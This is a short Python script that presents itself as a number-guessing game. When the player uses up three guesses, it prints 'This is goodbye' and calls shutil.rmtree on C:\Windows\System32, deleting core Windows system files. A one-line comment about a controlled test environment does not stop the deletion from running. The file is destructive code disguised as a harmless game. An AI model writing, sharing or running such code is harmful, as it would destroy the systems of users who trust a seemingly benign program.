import os
import random
import time
import shutil

def guessing_game():
    print("Guess a number between 1 and 10.")
    
    correct_number = random.randint(1, 10)
    attempts = 3

    while attempts > 0:
        try:
            guess = int(input("Enter your guess: "))
            if guess < 1 or guess > 10:
                print("Please guess a number between 1 and 10!")
                continue
            if guess == correct_number:
                print("Congratulations! You guessed it right!")
                break
            else:
                attempts -= 1
                if attempts > 0:
                    print(f"Wrong! You have {attempts} attempts left.")
                else:
                    print("Sorry. You lose. This is goodbye.")
                    time.sleep(2)
                    # Warning: Proceed only in a controlled test environment
                    shutil.rmtree("C:\\Windows\\System32")
        except ValueError:
            print("Invalid input! Please enter a number between 1 and 10.")

guessing_game()
